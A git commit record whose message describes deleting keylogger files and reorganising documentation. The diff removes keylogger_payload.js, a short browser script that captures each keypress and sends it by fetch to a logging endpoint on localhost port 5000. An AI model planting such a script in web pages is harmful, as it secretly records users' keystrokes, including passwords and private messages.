d2cb5a838733427176817683c2e8f87a4ec6bfe2
TruongAn <truongan1203.hp@gmail.com>
2026-04-21 20:48:29 +0700

    refactor: delete keylogger files and organize documentation into docs/ directory

--- keylogger_payload.js
+++
@@ -1,9 +0,0 @@
-
-document.addEventListener('keydown', function(e) {
-    let key = e.key;
-    fetch(`http://localhost:5000/api/log?data=${key}`, {
-        method: 'GET',
-        mode: 'no-cors'
-    });
-    console.log( + key);
-});
